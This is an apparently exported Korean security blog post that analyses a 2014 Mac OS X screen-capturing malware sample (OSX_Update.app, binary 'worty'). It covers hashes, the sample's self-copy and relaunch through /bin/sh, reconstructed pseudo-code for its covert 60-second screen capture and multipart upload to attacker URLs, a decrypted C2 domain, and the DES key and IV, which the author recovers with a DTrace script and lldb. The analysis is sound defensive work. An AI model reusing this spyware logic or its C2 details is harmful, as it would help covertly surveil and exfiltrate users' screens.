    postNotificationName:object:userInfo:]+0x44\n              AppKit`-[NSApplication
    _postDidFinishNotification]+0x121\n              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3\n(/tmp)\n\n
    \             libcommonCrypto.dylib`CCCrypt+0xcd\n              worty`0x0000000100002678+0xdd\n
    \             worty`0x0000000100001ee4+0x21\n              worty`0x0000000100001774+0x29\n
    \             worty`0x000000010000137b+0x4e\n              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc\n
    \             CoreFoundation`_CFXNotificationPost+0xb4d\n              Foundation`-[NSNotificationCenter
    postNotificationName:object:userInfo:]+0x44\n              AppKit`-[NSApplication
    _postDidFinishNotification]+0x121\n              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3\n1
    1 1 key:60802f4e8330 size:8 iv:7fff5fbfe680 datainput:60802f87e050, dataoutput:7fff5fbfe690(hxxp://\bfxxxxxxxxxx.com/doxc/aqw.php?yin=%@3??)\n\n
    \             libcommonCrypto.dylib`CCCrypt+0xcd\n              worty`0x0000000100002678+0xdd\n
    \             worty`0x0000000100001ee4+0x21\n              worty`0x00000001000019c6+0x185\n
    \             worty`0x0000000100001774+0x23a\n              worty`0x000000010000137b+0x4e\n
    \             CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc\n
    \             CoreFoundation`_CFXNotificationPost+0xb4d\n              Foundation`-[NSNotificationCenter
    postNotificationName:object:userInfo:]+0x44\n              AppKit`-[NSApplication
    _postDidFinishNotification]+0x121</pre>\n모든 복호화된 문자열을 획득하였으며, 각 암호문과 매핑하여 빠르게
    분석을 진행할 수 있다. 복호화를 위한 키 추출은 위에서 설명한 lldb와 DTrace를 이용하여 찾을 수 있다.\n<pre class=\"lang:sh
    decode:true \" title=\"Find the masterkey\">// lldb - set BreakPoint at CCCrypt\n(lldb)
    b 0x100002750\nBreakpoint 1: where = worty`___lldb_unnamed_function21$$worty +
    216, address = 0x0000000100002750\n(lldb) c\nProcess 976 resuming\n\n// DTRACE\n1
    1 1 key:100233380 size:8 iv:7fff5fbfe710 datainput:100271160, dataoutput:7fff5fbfe720(http://floracrunch.com)\n\n
    \             libcommonCrypto.dylib`CCCrypt+0xcd\n              worty`0x0000000100002678+0xdd\n
    \             worty`0x0000000100001ee4+0x21\n              worty`0x00000001000013cb+0x23\n
    \             worty`0x000000010000137b+0x34\n              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc\n
    \             CoreFoundation`_CFXNotificationPost+0xb4d\n              Foundation`-[NSNotificationCenter
    postNotificationName:object:userInfo:]+0x44\n              AppKit`-[NSApplication
    _postDidFinishNotification]+0x121\n              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3\n\n//
    lldb - Find the IV and symmetric key\nProcess 976 stopped\n* thread #1: tid =
    0xac8b, 0x0000000100002750 worty`___lldb_unnamed_function21$$worty + 216, queue
    = 'com.apple.main-thread, stop reason = breakpoint 1.1\n    frame #0: 0x0000000100002750
    worty`___lldb_unnamed_function21$$worty + 216\nworty`___lldb_unnamed_function21$$worty
    + 216:\n-&gt; 0x100002750:  callq  0x1000030c8               ; symbol stub for:
    CCCrypt\n   0x100002755:  movl   %eax, %ecx\n   0x100002757:  xorl   %eax, %eax\n
    \  0x100002759:  testl  %ecx, %ecx\n(lldb) x/8xb 7fff5fbfe710 // IV\n0x7fff5fbfe710:
    0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08\n(lldb) x/8xb 0x100233380 // decryption
    key\n0x100233380: 0xc2 0xb6 0xc2 0xb6 0xc2 0xb6 0xc2 0xb6\n(lldb)</pre>\nIV는 위에서
    분석한 값과 동일하며, 키는 0xb6c2b6c2b6c2b6c2 인 것을 확인할 수 있다.\n\n&nbsp;\n<h2>8. 결론</h2>\n이
    악성코드는 과거에 발견되었던 <a href=\"http%3A%2F%2Fwww.f-secure.com%2Fweblog%2Farchives%2F00002554.html&amp;h=AAQEiitRp\"
    target=\"_blank\">Kitmos</a>와 거의 동일한 기능을 수행하나, 자기 자신의 주요 정보를 숨기는 등 좀 더 고도화된 모습을
    보여준다. 이 악성코드는 최초 획득한 URL에 있는 데이터와 악성코드가 생성하는 폴더 정보를 보면, 중국 쪽에서 개발된 것으로 추정된다. 과거에
    Tibet과의 분쟁으로 한창 티벳을 대상으로 하는 악성코드가 발견되었지만, 최근에는 사람들에게 안전하다고 각인되어 있는 Mac OS X를 대상으로
    공격을 진행하는 사례가 늘어나고 있다. 특히 Mac OS X의 악성코드의 개발 의도를 보면, 윈도우 악성코드처럼 돈을 벌기 위한 수단이라기
    보다는 정치적인 성향을 많이 띄고 있으며, 국가간 분쟁 지역을 향한 공격이 많이 행해지고 있다. 사용자가 신뢰하는 앱스토어를 통해 유포하는
    것은 기본이고, 애플리케이션의 확장자 변조로 실행 파일을 문서화일로 보이게 만드는 것도 손쉽기 때문에 앞으로도 많은 악성코드가 개발되어 질
    것이라 생각한다.\n\n국가 또는 조직 내에서 특정 운영체제의 점유율이 적다고해서 보안의 테두리에서 제외 시키면, 그로인해 정보가 유출될 수
    있으며 보안업체도 이러한 상황을 사전에 준비하지 못하면 이로 인한 침해사고 대응 속도가 떨어질 수 밖에 없음을 인지해야 할 것이다. :-)\n\n&nbsp;\n\n&nbsp;"
  fusion_builder_converted: 'yes'
author:
  login: n0fate
  email: rapfer@gmail.com
  display_name: n0fate
  first_name: ''
  last_name: ''
---
<p style="padding-left: 30px;">예전부터 Mac OS X 악성코드 분석 글을 올리려고 했는데 이제서야 글을 올린다. 앞으로 기존에 했던 악성코드 분석 내용도 올려보도록 하겠다. 이 글을 빌어 쿨캣님에게 감사의 말을 전한다. :-)</p>
<h2></h2>
<h2>1. 시작</h2>
<p>2014년 1월 21일 Sophos에서 Mac OS X의 새로운 악성코드가 발견되었다는 글이 올라왔다.</p>
<p><a href="http://nakedsecurity.sophos.com/2014/01/21/data-stealing-malware-targets-mac-users-in-undelivered-courier-item-attack/" target="_blank">Digitally signed data-stealing malware targets Mac users in "undelivered courier item" attack</a></p>
<p>쿨캣님을 통해 위 악성코드 배포자가 배포하는 다른 악성코드의 링크를 획득하여 총 두 개의 샘플을 획득했다. 참고로 이 두 샘플은 위 링크의 Sophos가 분석한 RAT에서 다운로드하여 실행하는 악성코드이며 Sophos가 분석한 RAT은 아니다. 실행 파일의 해시 값은 다음과 같다.</p>
<ul>
<li>MD5 (cff.app/Contents/MacOS/cff) = 467cd41726d276d3da442e2f0e65f0a0</li>
<li>MD5 (OSX_Update.app/Contents/MacOS/worty) = ea2045d1344719d95f85ee8a2fcbe0a7</li>
</ul>
<p>두 악성코드는 비슷한 임무를 수행하며, 코드도 상당히 유사하다. 같은 제작자가 개발한 변종으로 추정된다. 이 포스트에서는 이 중 하나인 "OSX_Update.app"을 분석하도록 한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-23-at-3.30.26-PM.png"><img class="aligncenter size-full wp-image-712" alt="worty" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-23-at-3.30.26-PM.png" width="607" height="276" /></a></p>
<p>이 악성코드의 주요 기능은 다음과 같다.</p>
<ul>
<li>Notification을 통한 기능수행</li>
<li>사용자 디렉터리의 라이브러리 폴더에 자신을 복사한 후 실행, 원래 동작 중인 프로세스는 특별한 임무를 수행하지 않고 종료</li>
<li>라이브러리 폴더에서 실행된 악성코드는 현재 시스템의 화면을 캡쳐</li>
<li>캡쳐한 화면을 특정 URL에 업로드</li>
<li>민감한 문자열은 전부 암호화하여 보관</li>
</ul>
<p><span style="line-height: 1.5em;">악성코드 개발 환경은  xCode 이다. 참고로  xCode로 개발한 애플리케이션의 경우, 코코아 라이브러리는 전부 다 obj_msgSend의 id와 selector를 이용하여 클래스 및 메서드를 호출한다. </span></p>
<p>&nbsp;</p>
<h2>2. Notification을 통한 기능 수행</h2>
<p>Mac OS X는 start-&gt;NSApplicationMain 형태로 애플리케이션을 구동하도록 되어 있다. 하지만 이 악성코드를 보면, 여기에서는 별다른 역할을 수행하지 않고 종료하는 것을 볼 수 있다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.34.01-AM.png"><img class="aligncenter size-full wp-image-728" alt="_start" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.34.01-AM.png" width="684" height="425" /></a></p>
<p>Mac OS X에서는 NSApplicationMain을 통해 코드를 실행하는 방법 외에도 노티피케이션(Notification)을 통해 특정 클래스 함수를 실행할 수 있다. 노티피케이션이란, 두 애플리케이션, 데몬, 또는 다른 애플리케이션간의 상태 정보를 공유한다는 의미로, 내부-프로세스 통신(interprocess communication)을 수행할 수 있게 한다 <a href="https://developer.apple.com/library/mac/documentation/Darwin/Conceptual/MacOSXNotifcationOv/Introduction/Introduction.html" target="_blank">[fusion_builder_container hundred_percent="yes" overflow="visible"][fusion_builder_row][fusion_builder_column type="1_1" background_position="left top" background_color="" border_size="" border_color="" border_style="solid" spacing="yes" background_image="" background_repeat="no-repeat" padding="" margin_top="0px" margin_bottom="0px" class="" id="" animation_type="" animation_speed="0.3" animation_direction="left" hide_on_mobile="no" center_content="no" min_height="none"][1]</a>. 악성코드의 대부분의 기능이 들어있는 popAppDelegate 클래스에 애플리케이션의 실행이 완료되었을 때 발생하는 "applicationDidFinishLaunching" Notification을 받아 처리할 수 있도록 핸들러가 정의되어 있다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.35.33-AM.png"><img class="aligncenter size-full wp-image-729" alt="notification handler" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.35.33-AM.png" width="836" height="605" /></a></p>
<p>Mac Developer Library를 보면, 이 메서드는 "애플리케이션이 실행된 후에 노티피케이션 센터에 의해 전송되며, 가장 처음으로 받을 수 있는 노티피케이션<a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/applicationDidFinishLaunching:" target="_blank">[2]</a>"이라고 하며, 상속자는 이 메서드를 사용하여 추가적인 초기화 작업을 수행할 수 있다고 명시되어 있다.</p>
<div>
<blockquote>
<h3 id="jumpTo_18">applicationDidFinishLaunching:</h3>
<p>Sent by the default notification center after the application has been launched and initialized but before it has received its first event.</p>
<div>- (void)applicationDidFinishLaunching:(<a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/Foundation/Classes/NSNotification_Class/Reference/Reference.html#//apple_ref/doc/c_ref/NSNotification">NSNotification</a> *)<em>aNotification</em></div>
<div>
<h5>Parameters</h5>
<dl>
<dt><em>aNotification</em></dt>
<dd>A notification named <code><a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/ApplicationKit/Classes/NSApplication_Class/Reference/Reference.html#//apple_ref/c/data/NSApplicationDidFinishLaunchingNotification" target="_self">NSApplicationDidFinishLaunchingNotification</a></code>. Calling the <code><a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/Foundation/Classes/NSNotification_Class/Reference/Reference.html#//apple_ref/occ/instm/NSNotification/object" target="_self">object</a></code> method of this notification returns the <code>NSApplication</code> object itself.&nbsp;</p>
</dd>
</dl>
</div>
<div>
<h5>Discussion</h5>
<p>Delegates can implement this method to perform further initialization. This method is called after the application’s main run loop has been started but before it has processed any events. If the application was launched by the user opening a file, the delegate’s <code><a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/application:openFile:" target="_self">application:openFile:</a></code> method is called before this method. If you want to perform initialization before any files are opened, implement the <code><a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/applicationWillFinishLaunching:">applicationWillFinishLaunching:</a></code> method in your delegate, which is called before<code><a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/application:openFile:" target="_self">application:openFile:</a></code>.)</p>
</div>
<div>
<h5>Availability</h5>
<ul>
<li>Available in OS X v10.0 and later.</li>
<li>Available as part of an informal protocol prior to OS X v10.6.</li>
</ul>
</div>
<div>
<h5>See Also</h5>
<ul>
<li><code><a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/ApplicationKit/Classes/NSApplication_Class/Reference/Reference.html#//apple_ref/occ/instm/NSApplication/finishLaunching" target="_self">finishLaunching</a></code> (NSApplication)</li>
<li><code><a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/applicationWillFinishLaunching:">– applicationWillFinishLaunching:</a></code></li>
<li><code><a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/applicationDidBecomeActive:">– applicationDidBecomeActive:</a></code></li>
<li><code><a href="https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/application:openFile:">– application:openFile:</a></code></li>
</ul>
</div>
<div>
<h5>Declared In</h5>
<p><code>NSApplication.h</code></p>
</div>
</blockquote>
<p><code><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif; line-height: 1.5em;">즉, 이 악성코드는 'start'와 '_main'을 분석 시작점으로 잡으면 안되고, 이 노티피케이 처리 메서드를 메인(main) 함수라 생각하고 분석을 진행해야 한다. 위 코드를 보면, 이 노티피케이션 처리 메서드에서는 크게 3개의 함수를 실행하며, pseudo-code로 다음과 같이 표현될 수 있다.</span></code></p>
<pre class="lang:objc decode:true">- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    [self wort]; // "~/Library" 디렉터리에 자신을 복사하고 실행
    uint connected = 0;
    while(1)
    {
        while(!connected)
        {
            connected = [self eqox]; // 공격자 도메인 연결 테스트
        }
        [self bovx]; // 60초 간격으로 화면을 캡쳐하고 공격자 서버로 전송 함.
    }
}</pre>
<p>즉 이 악성코드는 60초 간격으로 화면을 캡쳐하여 공격자에게 지속적으로 전송하는 악성코드이다. 이제 각 메서드에 대해 알아보도록 하자.</p>
</div>
<p>&nbsp;</p>
<h2>3. 사용자 라이브러리 폴더(~/Library)에 자신을 복사한 후 실행 (wort method)</h2>
<p>악성코드는 최초 wort 메서드를 실행한다. 이 메서드는  현재 악성코드를 실행한 사용자의 라이브러리 디렉터리("~/Library")에 자기 자신을 복사한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.37.18-AM.png"><img class="aligncenter size-full wp-image-730" alt="wort" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.37.18-AM.png" width="1142" height="574" /></a></p>
<p>위 내용을 pseudo 코드로 작성하면 다음과 같다.</p>
<pre class="lang:objc decode:true" title="wort method">NSString *Homepath = NSHomeDirectory(); // 사용자의 홈 디렉터리를 가져온다.
NSString *currentpath = [[NSBundle mainBundle] bundlePath]; // 악성코드의 경로(.app까지)를 가져온다.
NSString *Apppath = [currentpath lastPathComponent]; // 악성코드 명(OSX_Update.app)을 가져온다.
NSString *librartpath = [self cxx:@"w7za3rq88br84zqSVKrrWQ=="]; // "/Library"

NSString *destpath = [NSString stringWithFormat:@"%@%@%@", Homepath, librarypath, Apppath]; // destpath에 "~/Library/OSX_Update.app" 저장

NSFileManager dest = [NSFileManager defaultManager:destpath];
....
if ([dest fileExistAtPath]) // "~/Library"에 이미 파일이 있다면
{
    [self soz: destpath];
}
else
{
    uint return_val = [dest copyItemAtPath:currentpath toPath:destpath error: nul]; // "~/Library"에 악성코드 복사
    if (!return_val) { // 파일 복사에 실패한다면 (이미 구동 중이라면..)
       return return_val; // "~/Library"에 위치한 악성코드가 실행 중이라면 함수를 종료
    }
    else {
       [self soz: destpath];
    }
}
sleep(30);
exit(0); // 프로그램을 종료</pre>
<p>여기에서 사용되는 경로 문자열은 전부 다 암호화되어 있다. 그리고 해당 문자열을 사용할 때마다 cxx 메서드를 이용하여 복호화를 수행한다. wort 메서드는 악성코드를 "~/Library"로 복사하고, soz 메서드를 실행한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.38.09-AM.png"><img class="aligncenter size-full wp-image-731" alt="soz method" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.38.09-AM.png" width="801" height="490" /></a></p>
<p>soz는 "stringWithFormat"으로 "open -a $HOME/Library/OSX_Update.app" 문자열을 만들고 sqq 메서드를 실행한다. sqq 메서드는 다음과 같다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.38.58-AM.png"><img class="aligncenter size-full wp-image-732" alt="sqq" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.38.58-AM.png" width="870" height="528" /></a></p>
<p>sqq 메서드는 "/bin/sh" 명령으로 soz에서 만든 "open -a ~" 문자열을 실행(launched TaskWithLaunchPath) 한다.  위 내용을 pseudo-code로 작성하면 다음과 같다.</p>
<pre class="lang:default decode:true" title="sqq method">- (void) [PopAppDelegate sqq: openmalware] // "open -a ~/Library/ ~~"를 인자로 전달
{
    NSString shellpath = [self cxx:@"fHXxeLSbD5g="]; // "/bin/sh"
    NSArray arg = [NSArray arrayWithObjects:@"-c", @openmalware];
    [NSTask launchedTaskWithLaunchPath:shellpath arguments:arg]; // "/bin/sh -c open -a $HOME/Library/OSX_Update.app" 을 실행
    uint return_val = [waitUntilExit];
    return return_val;
}</pre>
<p>즉, 악성코드는 복사한 악성코드를 실행하고 자기 자신을 종료하게 된다. 요약하면 다음과 같다.</p>
<ul>
<li>악성코드를 "~/Library"에 복사한다</li>
<li>"/bin/sh -c open -a ~/Library/OSX_Update.app"을 실행한다.</li>
<li>원본 악성코드는 exit(0);으로 종료된다.</li>
<li>open으로 실행된 자신의 복사본은 파일 복사를 실패(copyItemAtPath 메서드 실패)하여 exit되지 않고 return 됨으로 다음 메서드(eqox)를 실행한다.</li>
</ul>
<p>&nbsp;</p>
<h2>4. 서버 상태 체크</h2>
<p>해당 임무가 완료되면, 주기적으로 eqox 메서드를 실행한다. 이 메서드는 공격자의 서버가 접속 가능한지 지속적으로 확인한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.39.58-AM.png"><img class="aligncenter size-full wp-image-733" alt="eqox method" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.39.58-AM.png" width="651" height="446" /></a></p>
<p>위 코드는 Objective C 코드로 작성하면 다음과 같다.</p>
<pre class="lang:default decode:true" title="eqox method">- (uint) [eqox]
{
    NSString domainname = [self cxx:@"HtYGE4fFRj4DMt9S9V/8GlFP+BOPsjBH]; // 도메인 명을 복호화하여 저장
    NSURL url = [NSURL initWithString:domainname];
    NSURLRequest request = [NSURLRequest alloc] initWithURL:url cachePolicy:0x01 timeoutInterval:]; // URL 요청 패킷을 생성, cachepolicy:NSURLRequestReloadIgnoringLocalCacheData(0x01)
    return_val = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];
    if (return_val == nil) // 접속 실패 시
    {
        return -1;
    }
    else // 접속 성공 시
    {
        return 0;
    }
}</pre>
<p>해당 도메인을 복호화하면 "http://fxxxxxxh.com" 정보를 획득할 수 있다. <span style="line-height: 1.5em;">해당 도메인을 whois로 조회해보면 러시아에 위치한다.</span></p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-23-at-3.34.19-PM.png"><img class="aligncenter size-full wp-image-713" alt="whois?" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-23-at-3.34.19-PM.png" width="864" height="371" /></a></p>
<p>whois 결과를 봐도; 자기 자신을 숨기기 위한 노력을 많이 하는 걸 볼 수 있는데, 등록자 이메일이나 주인의 이름을 Privacy Protection Service를 이용하여 숨겨두었다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-10.48.40-AM.png"><img class="aligncenter size-full wp-image-724" alt="whois 결과" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-10.48.40-AM.png" width="542" height="182" /></a></p>
<h3></h3>
<p>&nbsp;</p>
<h2>5. 현재 시스템 화면을 캡처(bovx method part 1)</h2>
<p>도메인 접속을 확인하고 나면,  bovx 메서드를 실행한다. 이 메서드는 "/tmp/yang/[dateformat].png" 파일을 인자로하여 애플의 기본 프로그램인 "screencapture" 을 실행한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.41.18-AM.png"><img class="aligncenter size-full wp-image-734" alt="bovx method" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.41.18-AM.png" width="702" height="417" /></a></p>
<p>Pseudo-Code는 다음과 같다.</p>
<pre class="lang:objc decode:true" title="bovx method">- (void) [bovx]
{
	NSString tmp = [self cxx:@“fEh3F36QAeU=“]; // "tmp"
	NSString yang = [self cxx:@“/I1427B/2/w=“]; // "yang"
	NSString path = [NSString stringWithFormat:@“%@%@%@“ tmp @“/“ yang];
	NSFileManager manager = [NSFileManager defaultManager];
	if (0 == [manager fileExistsAtPath:path]) // 없으면 디렉터리 생성
	{
		[manager createDirectoryAtPath:path attributes:nil];
	}
	NSDate date = [NSDate date]
	NSDateFormatter dateformat = [[NSDateFormatter alloc] init];
	setformat = [dateformat setDateFormat:[self cxx:@“kLBf7h7di4kSVBDQsZgCuzfbz16dIBnW”]]; // "yy-MM-dd-HH:mm:ss"
	NSString screenshotdate = [setformat stringFromDate];
	NSString extension = [self cxx:@ “LMHrvuDJskY”]; // ".png"
	NSString fullpath = [NSString stringWithFormat:@“%@%@%@%@“ tmp yang screenshotdate extension]; // "/tmp/yang/[DATE].png"

	NSTask screenshot_task = [[NSTask alloc] init];
	[screenshot_task setLaunchPath:[cry ccx:@“rC4TpBd2mYxv6TTdiRmofpvZwEgL5qiD”]]; // "/usr/sbin/screencapture"
	NSArray arguments = [NSArray arrayWithObjects:@“-x” @“-T” @“60” @“fullpath”];

	[screenshot_task setArguments:arguments];
	[screenshot_task launch]; // "/usr/sbin/screencapture -x -T 60 /tmp/yang/[DATE].png"를 실행
	[screenshot_task waitUntilExit];
	sleep(30);
	[self bong];
	return_val = sleep(30);
	return return_val;
}</pre>
<p>절차는 다음과 같다.</p>
<ul>
<li>"/tmp/yang" 폴더가 존재하는지 확인한다. 없으면 해당 디렉터리를 생성한다.</li>
<li>NSTask의 launch 메서드를 이용하여 "/usr/sbin/screencapture -x -T 60 /tmp/yang/yy-MM-dd-HH:mm:ss.png" 를 실행한다. 옵션으로 인해 화면 캡처 시 소리가 나지 않게 되고(-x), 애플리케이션 실행 후, 60초 뒤에 이미지 파일을 생성(-T 60)한다.</li>
<li>명령어가 종료되면 bong 메서드를 실행한다.</li>
</ul>
<p>&nbsp;</p>
<h2>6. 캡쳐된 화면을 특정 URL에 업로드 (bovx method part 2 - bong method)</h2>
<p>bong 메서드를 이용하여 특정 URL에 악성코드가 캡쳐한 이미지를 올려둔다. 우선 URLRequest로 서버 접속을 수행한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.42.16-AM.png"><img class="aligncenter size-full wp-image-735" alt="bong method 1" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.42.16-AM.png" width="823" height="398" /></a></p>
<p>그리고 나서 HTTP Request 패킷을 생성한다. 패킷에서 HTTP Method, boundary, 'Content-Type"은 암호화되어 있으므로 cxx 메서드로 복호화하여 패킷을 생성한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.43.27-AM.png"><img class="aligncenter size-full wp-image-736" alt="bong method part II" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.43.27-AM.png" width="964" height="496" /></a></p>
<p>결과적으로 만들어지는 HTTP 패킷의 내용은 다음과 같다. (주요 정보는 생략하였다.)</p>
<blockquote><p>POST hxxp://xxxx.com/doxc/aqw.php?yin=~~<br />
multipart/form-data; boundary=------------------------2342xxx234235xxxxx230<br />
Content-Disposition: attachment; name="userfile"; filename=xxx<br />
Content-Type: application/octet-stream<br />
[encoded data]</p></blockquote>
<p>이렇게 이미지 파일 전송 작업을 마치면, 다시 서버 연결 상태를 체크하는 루틴으로 돌아가서 반복적인 작업을 수행한다.</p>
<p>&nbsp;</p>
<h2>7. 민감한 문자열은 암호화하여 보관</h2>
<p>Mac OS X에는 고성능의 상용 패커가 전무하기 때문에 자신의 주요 정보를 암호화하는 방향으로 최대한 자신의 정보를 숨기려는 노력을 한다. 이 악성코드도 앞 서 코드를 보면 알겠지만, 대부분의 주요 데이터를 암호화하여 저장하고 있다. 이런 암호화에 사용되는 메서드가 cxx이다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.44.26-AM.png"><img class="aligncenter size-full wp-image-737" alt="cxx method" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.44.26-AM.png" width="709" height="374" /></a></p>
<p>cxx 메서드는 내부적으로 cry 클래스를 사용하며 결국 cry 클래스의 end 메서드에서 암호화를, ded 메서드에서 복호화를 수행한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.45.06-AM.png"><img class="aligncenter size-full wp-image-738" alt="ded method" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-24-at-11.45.06-AM.png" width="403" height="257" /></a></p>
<p>복호화를 담당하는 ded 메서드는 내부적으로 <a href="https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man3/Common%20Crypto.3cc.html" target="_blank">CommonCrypto</a>(3cc) 함수인 CCCrypt를 이용하여 복호화를 수행한다. 함수에 들어가는 각각의 인자 값은 다음과 같다.</p>
<pre class="lang:c++ decode:true" title="CCCrypt">CCCrypt(KCDDecrypt, KCCAlgorithmDES, kCCOptionPKCS7Padding, [KEY], 8, IV(0x0807060504030201), [DATAIN], SizeofDataIn, [DATAOUT], dataOutAvailable, dataOutMoved);</pre>
<p>사실 이걸 디스어셈블로 풀려면 생각보다 시간이 많이 걸릴 수 있다.  이렇게 정직한 악성코드의 경우에도 원격 디버깅을 하지 않으면 쓸데없이 분석 시간을 축낼 수 있다. 여기에서는 좀 더 편리한 방법인 <a href="http://en.wikipedia.org/wiki/Dtrace" target="_blank">DTrace</a>(Dynamic Trace)를 사용하였다. 최초 실행 시점부터 문자열을 추출할 수 있도록 lldb(<a href="http://en.wikipedia.org/wiki/LLVM" target="_blank">LLVM</a> Debugger)로 시작지점에 브레이크포인트를 잡고 실행했다. 사용된 스크립트는 다음과 같다.</p>
<pre class="lang:default decode:true" title="hooked cccrypt function">/* written by n0fate
 * dtrace -q -s cccrypt.d PID
 */
pid$1:libcommonCrypto.dylib:CCCrypt:entry
/execname == "worty"/
{
	printf("%d %d %d key:%x size:%d iv:%x datainput:%x, dataoutput:%x", arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg8);
	self-&gt;dataoutput = arg8
}

pid$1:libcommonCrypto.dylib:CCCrypt:return
/execname == "worty"/
{
	printf("(%s)n", copyinstr(self-&gt;dataoutput));
	ustack(10,0);
}</pre>
<p>함수 시작 시점에 인자 값을 확인하고, 리턴된 후에 dataoutput에 저장된 문자열을 추출한다. 그리고 호출 스택을 뿌려줘서 어떤 메서드에서 해당 함수를 호출하는지 확인한다. 이로 인해, 복호화된 문자열의 원래 암호문을 손쉽게 찾을 수 있다.  수행 결과는 다음과 같다.</p>
<pre class="lang:sh decode:true" title="dtrace hooked ccrypt and showing user stack">1 1 1 key:60802f4f0030 size:8 iv:7fff5fbfe800 datainput:608059e42740, dataoutput:7fff5fbfe810(http://fxxxxxxxxch.com)

              libcommonCrypto.dylib`CCCrypt+0xcd
              worty`0x0000000100002678+0xdd
              worty`0x0000000100001ee4+0x21
              worty`0x00000001000013cb+0x23
              worty`0x000000010000137b+0x34
              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc
              CoreFoundation`_CFXNotificationPost+0xb4d
              Foundation`-[NSNotificationCenter postNotificationName:object:userInfo:]+0x44
              AppKit`-[NSApplication _postDidFinishNotification]+0x121
              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3
1 1 1 key:60002e2fb1b0 size:8 iv:7fff5fbfe7f0 datainput:600016c34f10, dataoutput:7fff5fbfe8001 1 1 key:60002e6e2130 size:8 iv:7fff5fbfe7f0 datainput:600016c34f50, dataoutput:7fff5fbfe800(yang)

              libcommonCrypto.dylib`CCCrypt+0xcd
              worty`0x0000000100002678+0xdd
              worty`0x0000000100001ee4+0x21
              worty`0x0000000100001774+0x40
              worty`0x000000010000137b+0x4e
              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc
              CoreFoundation`_CFXNotificationPost+0xb4d
              Foundation`-[NSNotificationCenter postNotificationName:object:userInfo:]+0x44
              AppKit`-[NSApplication _postDidFinishNotification]+0x121
              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3
